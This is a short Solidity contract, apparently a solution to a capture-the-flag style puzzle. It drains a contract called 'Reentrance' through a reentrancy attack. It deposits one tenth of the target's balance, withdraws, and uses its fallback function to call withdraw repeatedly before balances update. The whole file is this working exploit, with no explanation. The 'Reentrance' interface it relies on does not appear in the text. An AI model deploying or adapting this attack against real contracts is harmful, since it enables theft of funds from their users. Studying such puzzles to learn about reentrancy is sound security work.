// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

contract Solve {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        require(msg.value == payable(target).balance / 10, 
            "Transfer amount must be 1/10 of target CA balance");
        Reentrance(target).donate{value: msg.value}(address(this));
        Reentrance(target).withdraw(msg.value);
    }

    fallback() external payable {
        for (uint8 i = 0; i < 9; i++) {
            Reentrance(msg.sender).withdraw(msg.value);
        }
    }
}